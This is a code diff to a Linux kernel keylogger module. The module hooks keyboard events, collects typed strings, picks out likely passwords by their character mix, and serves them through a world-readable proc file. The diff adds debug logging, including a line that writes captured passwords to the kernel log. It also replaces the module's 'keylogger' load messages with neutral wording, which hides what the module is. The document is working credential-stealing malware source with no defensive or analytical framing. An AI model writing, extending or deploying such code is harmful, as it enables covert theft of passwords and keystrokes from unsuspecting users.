@@ -51,12 +51,14 @@ char buffer[BUFFER_SIZE + 1];
 
 void analyze_buffer(void)
 {
+    printk(KERN_INFO "DEBUG: analyze_buffer() - START");
     int lowercase_count = 0;
     int uppercase_count = 0;
     int number_count = 0;
     int symbol_count = 0;
 
     for (int i = 0; i < BUFFER_SIZE; i++) {
+        printk(KERN_INFO "DEBUG: analyze_buffer() - buffer[%d] = %c", i, buffer[i]);
         char c = buffer[i];
 
         if (islower(c)) {
@@ -69,8 +71,14 @@ void analyze_buffer(void)
             symbol_count++;
         }
     }
+    printk(KERN_INFO "DEBUG: analyze_buffer() - lowercase_count = %d", lowercase_count);
+    printk(KERN_INFO "DEBUG: analyze_buffer() - uppercase_count = %d", uppercase_count);
+    printk(KERN_INFO "DEBUG: analyze_buffer() - number_count = %d", number_count);
+    printk(KERN_INFO "DEBUG: analyze_buffer() - symbol_count = %d", symbol_count);
 
+    // TODO: Does not meet 3 of the 4 criteria requirement
     if (lowercase_count >= 1 && uppercase_count >= 1 && number_count >= 1 && symbol_count >= 1) {
+        printk(KERN_INFO "DEBUG: analyze_buffer() - Potential password found: %s", buffer);
         strncpy(db.passwords[db.count], buffer, BUFFER_SIZE);
         db.count++;
         if (db.count >= MAX_PASSWORDS) {
@@ -80,6 +88,7 @@ void analyze_buffer(void)
 
     memset(buffer, 0, sizeof(buffer));
     buffer_index = 0;
+    printk(KERN_INFO "DEBUG: analyze_buffer() - END");
 }
 
 static int keylogger_callback(struct notifier_block *nblock, unsigned long code, void *_param)
@@ -87,14 +96,17 @@ static int keylogger_callback(struct notifier_block *nblock, unsigned long code,
     struct keyboard_notifier_param *param = _param;
 
     if (code == KBD_KEYCODE && param->down) {
+        printk(KERN_INFO "DEBUG: keylogger_callback() - keycode = %u", param->value);
         unsigned int keycode = param->value;
         char c = toascii(keycode);
 
         if (c != '\0') {
+            printk(KERN_INFO "DEBUG: keylogger_callback() - c = %c", c);
             buffer[buffer_index] = c;
             buffer_index++;
 
             if (buffer_index >= BUFFER_SIZE) {
+                printk(KERN_INFO "DEBUG: keylogger_callback() - Buffer full, analyzing...");
                 analyze_buffer();
             }
         }
@@ -105,11 +117,13 @@ static int keylogger_callback(struct notifier_block *nblock, unsigned long code,
 
 ssize_t read_proc(struct file *filp, char *buf, size_t count, loff_t *offp)
 {
+    printk(KERN_INFO "DEBUG: read_proc() - START");
     int len = 0;
     int i;
     for (i = 0; i < db.count; i++) {
         len += sprintf(buf + len, "%s\n", db.passwords[i]);
     }
+    printk(KERN_INFO "DEBUG: read_proc() - END");
     return len;
 }
 
@@ -123,7 +137,7 @@ static struct proc_ops keylogger_proc_ops = {
 
 static int __init keylogger_init(void)
 {
-    printk(KERN_INFO "keylogger: Module loaded");
+    printk(KERN_INFO "Module loading...");
     proc_file = proc_create(PROC_FILENAME, 0666, NULL, &keylogger_proc_ops);
     if (!proc_file) return -ENOMEM;
 
@@ -132,14 +146,16 @@ static int __init keylogger_init(void)
 
     register_keyboard_notifier(&keylogger_nb);
 
+    printk(KERN_INFO "Module loaded");
     return 0;
 }
 
 static void __exit keylogger_exit(void)
 {
-    printk(KERN_INFO "keylogger: Module unloaded");
+    printk(KERN_INFO "Module unloading...");
     unregister_keyboard_notifier(&keylogger_nb);
     remove_proc_entry(PROC_FILENAME, NULL);
+    printk(KERN_INFO "Module unloaded");
 }
 
 module_init(keylogger_init);
